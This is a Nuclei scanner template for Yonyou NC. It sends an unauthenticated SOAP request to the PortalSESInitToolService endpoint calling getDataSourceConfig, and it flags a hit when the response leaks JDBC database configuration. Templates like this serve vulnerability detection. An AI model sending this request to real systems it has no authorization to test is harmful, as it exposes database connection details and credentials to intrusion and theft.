nuclei/用友NC-nc-itf-ses-inittool-信息泄露.yaml

id: yongyou-PortalSESInitToolService-infoleak
info:
  name: yongyou-PortalSESInitToolService-infoleak
  author: yongyou-PortalSESInitToolService-infoleak

requests:
  - raw:
      - |
         POST /uapws/service/nc.itf.ses.inittool.PortalSESInitToolService HTTP/1.1
         Host: {{Hostname}}
         Connection: keep-alive
         Accept-Encoding: gzip, deflate
         Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
         User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25
         Content-Type: application/x-www-form-urlencoded
         Accept-Language: zh-CN,zh;q=0.9

         <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:por="http://inittool.ses.itf.nc/PortalSESInitToolService">
         <soapenv:Header/>
         <soapenv:Body>
            <por:getDataSourceConfig/>
         </soapenv:Body>
         </soapenv:Envelope>

    matchers:
      - type: dsl
        dsl:
          - contains_all(body,"jdbc:")





